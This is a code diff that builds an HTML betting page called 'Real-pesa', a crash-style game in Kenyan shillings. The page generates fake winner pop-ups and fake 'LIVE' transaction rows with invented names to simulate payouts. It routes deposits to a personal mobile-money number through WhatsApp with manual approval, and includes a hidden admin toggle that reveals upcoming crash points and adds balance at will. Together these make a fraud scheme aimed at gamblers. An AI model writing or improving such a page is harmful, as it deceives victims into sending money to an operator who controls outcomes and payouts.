@@ -1,35 +1,103 @@
-// --- ADD THESE NEW FUNCTIONS TO YOUR SCRIPT SECTION ---
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Real-pesa | 24/7 Live</title>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+<style>
+:root{--p:#2e7d32;--m:#66bb6a;--d:#0a0a0a;--r:#ff5252;--g:#1a1a1a;}body{font-family:'Segoe UI',sans-serif;margin:0;background:var(--d);color:#fff;text-align:center;overflow-x:hidden;}
+header{background:linear-gradient(to bottom, var(--p), #1b5e20);padding:20px;font-weight:bold;cursor:pointer;}.logo{font-size:1.5rem;letter-spacing:2px;text-shadow:2px 2px #000;}
+.hist{background:var(--g);padding:10px;display:flex;justify-content:center;gap:8px;font-size:0.75rem;border-bottom:1px solid #333;}
+.h-item{background:#444;padding:4px 10px;border-radius:15px;color:var(--m);font-weight:bold;}.game{background:radial-gradient(circle, #222 0%, #000 100%);margin:15px;height:160px;border-radius:15px;border:1px solid #444;display:flex;flex-direction:column;justify-content:center;}
+#mult{font-size:4rem;font-weight:bold;transition:0.05s;}.ctrl{padding:20px;background:var(--g);margin:15px;border-radius:20px;border:1px solid #333;}
+input{width:80%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #444;background:#111;color:#fff;}
+.btn{width:95%;padding:18px;border:none;border-radius:12px;font-weight:bold;font-size:1.2rem;cursor:pointer;margin-bottom:12px;text-transform:uppercase;}
+.bet{background:var(--m);color:#fff;}.cash{background:#fbc02d;color:#000;display:none;}.wd-btn{background:#25d366;color:#fff;font-size:0.9rem;padding:12px;}.dep-btn{background:var(--p);color:#fff;font-size:0.9rem;padding:12px;}
+.tx-list{margin:15px;background:var(--g);padding:15px;border-radius:15px;border:1px solid #333;text-align:left;}
+.tx-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:0.8rem;}
+.win-c{color:var(--m);font-weight:bold;}.loss-c{color:var(--r);}
+.footer-box{background: #1a1a1a; padding: 15px; border-top: 1px solid #333; margin-top: 20px;}
+.live-tag { background: #ff5252; color: white; padding: 2px 5px; border-radius: 4px; font-size: 0.6rem; margin-right: 5px; animation: pulse 1s infinite; }
+@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+@keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+@keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(120%); opacity: 0; } }
+</style></head><body>
+<audio id="bgMusic" loop><source src="music.mp3" type="audio/mpeg"></audio>
+<header onclick="showAdmin()"><div class="logo">REAL-PESA</div></header>
+<div class="hist" id="hist"><span>History:</span></div>
+<div class="game"><div id="mult">1.00x</div><div id="stat" style="color:#aaa;font-size:0.8rem;">FLYING...</div></div>
+<div class="ctrl">
+    <div style="margin-bottom:10px;color:var(--m);">Wallet: <span id="bal" style="font-weight:bold;">KES 0.00</span></div>
+    <input type="number" id="amt" placeholder="Bet Amount">
+    <button id="betBtn" class="btn bet" onclick="placeBet()">Place Bet</button>
+    <button id="cashBtn" class="btn cash" onclick="cashOut()">CASH OUT</button>
+    <div style="display:flex;gap:10px;"><button class="btn dep-btn" style="flex:1;" onclick="deposit()">Deposit</button><button class="btn wd-btn" style="flex:1;" onclick="withdraw()">Withdraw</button></div>
+</div>
+<div class="tx-list"><div style="font-weight:bold;margin-bottom:10px;color:var(--m);">Recent Transactions</div><div id="tx-data"></div></div>
+<div class="footer-box">
+    <div style="color: #66bb6a; font-weight: bold; font-size: 0.9rem;">OFFICIAL POCHI LA BIASHARA</div>
+    <div style="font-size: 1.1rem; margin: 5px 0;">0797097831</div>
+    <div style="font-size: 0.7rem; color: #888;">Send funds then WhatsApp confirmed message for approval.</div>
+</div>
+<script>
+// --- PASTE YOUR FIREBASE CONFIG HERE ---
+const firebaseConfig = { apiKey: "YOUR_KEY", authDomain: "YOUR_DOMAIN", projectId: "YOUR_ID", storageBucket: "YOUR_BUCKET", appId: "YOUR_APP_ID" };
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-// 1. Fake Pop-up Notification
-function showFakeWinner() {
-    const names = ["Kamau", "Ochieng", "Moraa", "Fatuma", "Kiprono", "Njeri", "Mwangi", "Wanjiku"];
-    const amounts = [450, 1200, 300, 2500, 800, 1500, 600];
-    
-    const randomName = names[Math.floor(Math.random() * names.length)];
-    const randomAmt = amounts[Math.floor(Math.random() * amounts.length)];
-    
-    // Create the pop-up element
-    const toast = document.createElement("div");
-    toast.style.cssText = `
-        position: fixed; top: 20px; right: 20px; 
-        background: #2e7d32; color: white; padding: 15px; 
-        border-radius: 10px; z-index: 1000; font-size: 0.8rem;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.5); border-left: 5px solid #fff;
-        animation: slideIn 0.5s ease-out;
-    `;
-    toast.innerHTML = `🔥 <b>${randomName}</b> just won <b>KES ${randomAmt}</b>!`;
-    
-    document.body.appendChild(toast);
-    
-    // Remove it after 3 seconds
-    setTimeout(() => {
-        toast.style.animation = "slideOut 0.5s ease-in";
-        setTimeout(() => toast.remove(), 500);
-    }, 3000);
+let m=1.0, isFlying=false, myBet=0, h=[], iv, wallet=0, nextCrash=0, isAdmin=false, txs=[], currentUser="Guest_" + Math.floor(Math.random()*999);
+const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('betBtn'), cb=document.getElementById('cashBtn'), bl=document.getElementById('bal'), td=document.getElementById('tx-data'), music=document.getElementById('bgMusic');
+
+window.onload = () => {
+    loop(); 
+    music.play().catch(()=>{}); 
+    db.collection("players").doc(currentUser).onSnapshot((doc) => { if(doc.exists) { wallet = doc.data().balance; bl.innerText="KES "+wallet.toFixed(2); renderTxs(); }});
+    setInterval(triggerWinnerAlert, 10000); 
+    setInterval(addFakeTxRow, 6000);
+};
+
+function loop(){ 
+    isFlying=true; m=1.0; x.style.color="#fff"; s.innerText = "FLYING...";
+    nextCrash = (Math.random()*6 + 1.1).toFixed(2); 
+    if(isAdmin) s.innerText = "PRED: " + nextCrash + "x";
+    iv=setInterval(()=>{ 
+        m+=0.01; x.innerText=m.toFixed(2)+"x"; 
+        if(m>=nextCrash){ 
+            clearInterval(iv); isFlying=false; addH(m.toFixed(2)); 
+            x.innerText="CRASHED!"; x.style.color="var(--r)"; s.innerText = "NEXT ROUND SOON...";
+            b.style.display="block"; cb.style.display="none"; myBet=0; setTimeout(loop, 3000); 
+        } 
+    },100); 
 }
 
-// 2. Fake Transaction Generator
-function addFakeTransaction() {
-    const fakeTypes = ["Won Round", "Deposit", "Won Round"];
-    const type = fakeTypes[Math.floor(Math.random() * fakeTypes.length)];
-    
+const fakeNames = ["Kamau", "Ochieng", "Moraa", "Fatuma", "Kiprono", "Njeri", "Mwangi", "Wanjiku"];
+const fakeAmts = [250, 500, 1200, 300, 4500, 800, 1500, 600];
+
+function triggerWinnerAlert() {
+    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+    const amt = fakeAmts[Math.floor(Math.random() * fakeAmts.length)];
+    const toast = document.createElement("div");
+    toast.style.cssText = `position: fixed; top: 10px; right: 10px; background: #1a1a1a; color: white; padding: 12px; border-radius: 8px; z-index: 9999; font-size: 0.8rem; border-left: 4px solid #66bb6a; box-shadow: 0 4px 10px rgba(0,0,0,0.8); animation: slideIn 0.5s ease-out;`;
+    toast.innerHTML = `🎉 <b>${name}</b> just withdrew <span class="win-c">KES ${amt}</span>!`;
+    document.body.appendChild(toast);
+    setTimeout(() => { toast.style.animation = "slideOut 0.5s ease-in"; setTimeout(() => toast.remove(), 500); }, 4000);
+}
+
+function addFakeTxRow() {
+    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+    const amt = fakeAmts[Math.floor(Math.random() * fakeAmts.length)];
+    const type = Math.random() > 0.3 ? "Won Round" : "Deposit";
+    const row = document.createElement("div");
+    row.className = "tx-item";
+    row.innerHTML = `<span><span class="live-tag">LIVE</span> ${name} - ${type}</span><span class="win-c">KES ${amt}</span>`;
+    if (td) { td.insertBefore(row, td.firstChild); if (td.children.length > 8) td.lastChild.remove(); }
+}
+
+async function updateDb() { await db.collection("players").doc(currentUser).update({ balance: wallet, transactions: txs }); }
+function renderTxs(){ /* Handled by Live Feed and local user txs */ }
+async function addTx(type, amt){ txs.unshift({type: type, amt: amt}); if(txs.length > 5) txs.pop(); await updateDb(); }
+function showAdmin(){ isAdmin=!isAdmin; let cmd = prompt(isAdmin?"Admin Active. Type 'add':":"OFF"); if(cmd==="add"){ let a=parseFloat(prompt("Amount?")); wallet += a; addTx("Admin Deposit", a); } }
+function addH(v){h.unshift(v);if(h.length>6)h.pop();let html='<span>History:</span>';h.forEach(i=>{html+=`<span class="h-item">${i}x</span>`});document.getElementById('hist').innerHTML=html;}
+async function placeBet(){ let a=parseFloat(document.getElementById('amt').value)||10; if(wallet < a){ alert("Low Balance!"); return; } myBet=a; wallet -= a; await addTx("Place Bet", -a); b.style.display="none"; cb.style.display="block"; }
+async function cashOut(){ if(myBet>0 && isFlying){ let win = (myBet * m); wallet += win; await addTx("Won Round", win.toFixed(0)); b.style.display="block"; cb.style.display="none"; myBet=0; alert("Won KES "+win.toFixed(2)); } }
+function deposit(){ window.location.href=`https://wa.me/254797097831?text=Deposit%20Guest:%20${currentUser}`; }
+function withdraw(){ window.location.href=`https://wa.me/254797097831?text=Withdraw%20Request:%20KES%20${wallet}%20Guest:%20${currentUser}`; }
+</script></body></html>
